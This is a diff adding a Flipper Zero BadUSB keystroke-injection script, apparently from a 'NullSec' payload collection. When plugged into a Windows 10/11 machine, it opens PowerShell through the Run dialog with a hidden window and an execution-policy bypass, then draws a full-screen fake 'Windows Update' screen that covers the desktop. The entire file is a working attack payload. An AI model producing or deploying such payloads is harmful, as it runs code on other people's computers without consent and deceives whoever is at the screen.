@@ -1,0 +1,39 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Fake Windows Update Screen
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 500
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+STRING $form = New-Object System.Windows.Forms.Form
+ENTER
+STRING $form.Text = 'Windows Update'
+ENTER
+STRING $form.BackColor = [System.Drawing.Color]::FromArgb(0,120,215)
+ENTER
+STRING $form.FormBorderStyle = 'None'
+ENTER
+STRING $form.WindowState = 'Maximized'
+ENTER
+STRING $label = New-Object System.Windows.Forms.Label
+ENTER
+STRING $label.Text = "Working on updates`n`nDo not turn off your PC. This will take a while.`n`nYour PC will restart several times."
+ENTER
+STRING $label.ForeColor = 'White'
+ENTER
+STRING $label.Font = New-Object System.Drawing.Font('Segoe UI',24)
+ENTER
+STRING $label.AutoSize = $true
+ENTER
+STRING $label.Location = New-Object System.Drawing.Point(400,300)
+ENTER
+STRING $form.Controls.Add($label)
+ENTER
+STRING $form.ShowDialog()
+ENTER
